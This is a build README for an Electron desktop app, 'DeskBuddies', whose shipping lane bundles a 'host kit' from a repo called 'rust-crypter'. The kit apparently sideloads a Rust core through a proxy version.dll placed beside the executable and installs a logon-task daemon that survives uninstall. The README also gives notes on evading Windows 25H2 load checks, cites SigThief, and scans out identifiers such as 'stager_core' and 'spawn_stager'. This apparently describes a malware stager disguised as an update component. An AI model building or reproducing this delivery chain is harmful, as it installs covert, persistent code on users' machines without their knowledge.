# Building DeskBuddies

DeskBuddies is an Electron + Vite app. Packaging is electron-builder; the
shipping lane additionally stages the reusable **host kit** (the Rust update
core) beside the packaged executable.

## Prerequisites

- **Node 24+** (built here on node v24.18.0; the Windows box runs v24.20.0).
- `npm ci` once per checkout.
- **Windows packaging** normally runs on Windows. On Linux the win leg needs
  wine; the Debian box has none, so use the unpacked leg and disable executable
  resource editing (see *Gates* below).
- The **stager leg** additionally needs the sibling `shroud/rust-crypter`
  checkout - see *Building with the update core*.

## Everyday commands

| Command | What it does |
|---|---|
| `npm ci` | install dependencies |
| `npm run dev` | Vite dev server + Electron |
| `npm run build` | `tsc --noEmit` + Vite build into `build-output/` |
| `npm test` | vitest |
| `npm run make-icon` | regenerate `build/icon.png` |
| `npm run dist` | plain package - **no update core** (core-less) |
| `npm run dist:stager` | **the shipping lane** - stage the host kit, then package |

## Building with the update core

### What the kit is

The host kit is one reusable Windows drop-in emitted by the sibling
`shroud/rust-crypter` checkout (`tools/host-kit/build-host-kit.sh`). DeskBuddies
**consumes** it; this repo never builds the DLLs itself. The Creator Desk and
the OBS lane consume the same kit, so the delivery chain stays identical across
hosts.

### Kit contract

The kit is a directory containing exactly these files:

| File | Role |
|---|---|
| `version.dll` | genuine-MS forwarding stub - the 6 version exports the host imports |
| `vmin.dll` | the Rust update core (cdylib over `crates/app-update-core`) |
| `app-update-daemon.exe` | logon-task target; survives app uninstall |
| `seed-conf.ps1` | seeds `desk.conf` - **SERVER only, never a token** |
| `install-hooks.nsh` | NSIS include: conf seeding + logon task + legacy sweep |
| `MANIFEST.txt` | size + sha256 + source commits for every artifact |

### How this repo consumes it

1. `scripts/build-with-stager.mjs` resolves the kit from, in order:
   `--kit <dir>`, `HOST_KIT_DIR`, or a sibling `rust-crypter` checkout
   (it runs that checkout's `tools/host-kit/build-host-kit.sh` and picks up the emitted
   `host-kit/`; override the emit path with `--kit-out`).
2. It fails closed if the kit is incomplete, if any shipped binary disagrees with
   `MANIFEST.txt`, or if a build-path / stale identifier survives in the core.
3. It stages the kit into `stager-stage/` (gitignored) and writes
   `stager-stage/PROVENANCE.txt`.
4. `package.json -> build.extraFiles` copies `version.dll`, `vmin.dll` and
   `app-update-daemon.exe` to the **app root**, i.e. beside
   `DeskBuddies.exe`. `extraResources` would drop them in `resources/` and
   break the lane - do not switch it.
5. `package.json -> build.nsis.include` points at
   `build/installer/stager-hooks.nsh`, the bridge to the kit's NSIS include.
   It writes `stager-stage/HOSTKIT-DEFINES.nsh` too, so the bridge can supply
   the values the kit requires:

   | define | value for this host |
   |---|---|
   | `HOSTKIT_SERVER` | from `--server` (the kit `!error`s without it) |
   | `HOSTKIT_DAEMON_NAME` | `app-update-daemon.exe` - must match `extraFiles`, because the hook stages the daemon out of `$INSTDIR` |
   | `HOSTKIT_TASK_NAME` | `Bright Floppy DeskBuddies Update` (the kit default names the Creator Desk) |

   The kit ships **Tauri-style** hook macros (`NSIS_HOOK_PREINSTALL` and
   friends); electron-builder calls its own hooks (`customInit`,
   `customInstall`, `customUnInstall`). The bridge maps one onto the other -
   `customInstall` runs after the app files land, so the daemon is in place for
   the staging step, and `customUnInstall` runs before electron-builder deletes
   the installed files, which is what keeps the uninstall frontend-only.

   If the kit was not staged, the bridge emits a compile-time warning and the
   installer is built **without** conf seeding or the logon task, rather than
   failing - a core-less installer must never be mistaken for a shipping one.
   If the kit was staged without `--server`, it is a hard `!error` instead:
   there is no safe default endpoint to seed.
6. The NSIS include applies to the `nsis` target only; the `portable`
   target carries no installer hooks.

### Prerequisites for the stager leg

- The sibling checkout `../rust-crypter` (the core is consumed through path
  dependencies) - clone `shroud/rust-crypter` beside this repo.
- The `x86_64-pc-windows-gnu` Rust target and the mingw toolchain, which the
  kit builder owns.

**A fresh checkout cannot build the stager leg.** Without the sibling
`rust-crypter` checkout there is no kit, and `npm run dist:stager` stops with
an explicit error listing the three ways to supply one. `npm run dist` still
works and produces a core-less package.

### The 25H2 two-file constraint

From the USB-lane README (bisect-proven 2026-09-04), verbatim:

> Non-genuine `version.dll` beside the exe = process killed at load on
> 25H2 26200 (empty C DLL dies; SigThief dies; fingerprints-only dies).
> Two-file pattern (real-MS version.dll + arbitrary-named core) is the
> survivor. Single-file lane: WINSPOOL.DRV name tolerated ONLY when
> pristine/unsigned - patched or Rust builds die under it. Do NOT ship
> non-genuine version.dll builds to 25H2+ boxes.

Consequences for this lane: the two DLLs must land **beside** the executable
(never in `resources/`), and `version.dll` must remain the kit's stub. Never
rename the Rust core to `version.dll` and never hand-assemble the folder.

### Gates

```sh
# (a) build
npm ci && npm run build

# (b) unpacked Windows leg - the local gate (no wine on this box)
npm run dist:stager -- --kit <kit-dir> --dir -c.win.signAndEditExecutable=false
ls release/win-unpacked/     # DeskBuddies.exe + version.dll + vmin.dll + app-update-daemon.exe

# (b2) the NSIS half - the unpacked gate never runs makensis, so compile it
node scripts/build-with-stager.mjs --stage-only --kit <kit-dir> --server https://example.invalid
makensis -V2 -DSMOKE_OUT=/tmp/hook-smoke.exe "$PWD/build/installer/hook-smoke.nsi"
# -> exit 0: the kit include and the hook mapping really expand.
# Pass an ABSOLUTE script path: NSIS resolves ${__FILEDIR__} from the path it was
# given, and electron-builder always hands it an absolute one.

# (c) + (d) are enforced by the lane script itself, on every run:
#   (c) sha256 of the staged binaries vs the kit MANIFEST.txt
#   (d) identifier scan: 0 x /home/jacob, stager_core, StagerHost, spawn_stager, bf-daemon
```

`-c.win.signAndEditExecutable=false` is required on Linux only: without wine,
electron-builder cannot rcedit the executable, and `--dir` then completes
without touching resources. On Windows, do not pass it.

### Windows full installer (the real gate)

On the Windows box (`windowsmain`, node v24.20.0), in a scratch copy - never in
a working copy:

```sh
npm ci
npm run dist:stager -- --kit <kit-dir> --server https://<endpoint>
# -> release/DeskBuddies Setup 0.2.0.exe  (+ the portable artifact)
```

No wine flag there: Windows edits and signs natively. `--server` is required for
any installer target: it is the endpoint the installer seeds into
`%LOCALAPPDATA%\BrightFloppy\desk.conf` (SERVER only - never a token), and the
kit's include refuses to compile without it. `--dir` and `--stage-only` may
omit it.

### What the installer must never do

**No token seeding.** INV-44 P0-1: the installer writes
`%LOCALAPPDATA%\BrightFloppy\desk.conf` with `SERVER` only; per-install
enrolment owns the token. That logic lives in the kit's `install-hooks.nsh` and
`seed-conf.ps1`; this repo only wires the include in. If a future change makes
an installer write `AGENT_TOKEN`, that is a P0 regression, not a build detail.
